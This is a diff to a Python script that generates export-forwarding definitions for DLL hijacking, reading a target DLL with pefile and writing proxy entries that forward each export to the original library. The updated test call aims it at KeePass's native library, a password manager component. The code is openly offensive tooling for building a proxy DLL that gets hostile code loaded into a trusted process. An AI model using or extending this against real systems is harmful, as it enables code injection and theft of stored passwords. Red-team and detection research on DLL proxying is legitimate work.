@@ -9,11 +9,12 @@ Returns:
 
 import pefile, asyncio
 
-async def generate_proxies(dllfile):
+async def generate_proxies(dll_file, dll_file_name):
     """Generate Pragma Linkers for DLL Hijacking
 
     Args:
-        dllfile (bytes): DLL File to hijack
+        dll_file (Path): DLL File to hijack
+        dll_file_name (str): DLL Name to populate exports
 
     Raises:
         Exception: File is not a DLL
@@ -21,8 +22,8 @@ async def generate_proxies(dllfile):
     Returns:
         str: Linker Pragmas
     """
-    if pefile.PE(dllfile).is_dll:
-        dll_pe = pefile.PE(dllfile)
+    if pefile.PE(dll_file).is_dll:
+        dll_pe = pefile.PE(dll_file)
     else:
         raise Exception("[-] Invalid Selection: Target file is not a DLL.")
 
@@ -30,10 +31,12 @@ async def generate_proxies(dllfile):
         lines = ["EXPORTS"]
         for exp in dll_pe.DIRECTORY_ENTRY_EXPORT.symbols:
             if exp.name:
-                lines.append(f"{exp.name.decode()} @{exp.ordinal}")
+                lines.append(f"{exp.name.decode()}={dll_file_name}.{exp.name.decode()} @{exp.ordinal}")
+            else:
+                lines.append(f"@{exp.ordinal}={dll_file_name}.@{exp.ordinal} NONAME")
         return "\n".join(lines)
 
 # Test to see if the function generates anything
 if __name__ == "__main__":
-    pragmas = asyncio.run(generate_proxies("C:\\Windows\\System32\\winhttp.dll"))
+    pragmas = asyncio.run(generate_proxies(r"F:\Program Files\KeePass Password Safe 2\KeePassLibN.a64.dll", "KeePassLibN.a64.dll"))
     print(pragmas)
